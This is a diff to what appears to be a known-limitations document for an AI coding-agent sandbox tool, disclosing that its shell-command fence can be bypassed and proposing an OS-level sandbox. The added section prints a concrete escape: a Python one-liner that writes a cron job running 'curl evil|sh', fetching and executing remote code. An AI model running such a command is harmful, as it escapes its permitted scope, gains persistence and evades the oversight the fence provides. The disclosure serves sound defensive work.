@@ -29,13 +29,34 @@ with the reason and the resolved target.
   That is deliberate (blocking unrecognised tools would break the agent in ways that look like
   model errors) and is the wrong default for a hostile model.
 - **Proof of the limit:** with `allowedPaths: ["src"]`, a model that was told to write outside
-  the fence was blocked. A model that instead ran a shell one-liner would not have been.
+  the fence was blocked. A model that instead ran a shell one-liner would not have been. The
+  concrete escape, which passes every check BW-059 makes:
+
+  ```bash
+  python3 -c "open('/etc/cron.d/x','w').write('* * * * * curl evil|sh')"
+  ```
+
+  No path argument looks outside the fence, and the working directory is in scope. The write
+  happens inside the interpreter, where a policy that inspects command strings cannot see it.
+  This is why no amount of additional string inspection closes the gap, and why the fix must be
+  OS-level.
 
 **Consequence.** Bashwink is safe to point at a repository you would let a careful contractor
 touch, not at a machine you do not trust. Real isolation needs an OS-level sandbox (BW-031).
 
 **Workaround.** Set a contract whose `forbiddenCommands` includes `shell`; the fence then refuses
-every shell call and only file tools remain, which *are* path-bounded.
+every shell call and only file tools remain, which *are* path-bounded. This is the only setting
+under which the current fence is a real boundary, and it costs you the agent's ability to run
+tests — which is most of the value.
+
+**Proposal for the fix.** `BW-031-SANDBOX-PROPOSAL.md` specifies a Seatbelt (macOS) + bubblewrap
+(Linux) adapter built on the same `ScopePolicy`, with 21 negative tests covering interpreter
+escapes, symlinks, credential reads, network egress and the failure-to-create-sandbox path. It
+records that both Claude Code and Zed converged on those two primitives and stopped treating
+Docker as the default, and it departs from BW-031's "Docker" wording deliberately — that needs
+sign-off, not a silent reinterpretation. Feasibility was verified on this machine: a Seatbelt
+profile denied outside writes and all network while permitting in-scope writes, and the
+`/tmp` → `/private/tmp` resolved-path trap was reproduced before it could break real work.
 
 ---
 
@@ -174,7 +195,15 @@ under test — but a user's own runs are not protected this way.
 
 ---
 
-## 10. What the fence does not manage
+## 10. An unrecognised subcommand is forwarded to the runtime
+
+`bashwink <typo>` passes the word to the runtime, which treats it as a directory and fails with
+`chdir ... -> 'frobnicate'`. Bashwink now reports that honestly — "the runtime exited 1 before any
+evidence was written, so no work is known to have happened" — and exits 1. It is still a poor
+error, and there is no `sessions` subcommand (the runtime spells it `session`), so a user looking
+for session management will hit this.
+
+## 11. What the fence does not manage
 
 - **The trust file is the real permission switch.** `bashwink trust <dir>` allows writes and
   shell in that workspace; an untrusted workspace is read-only regardless of any contract. Do not
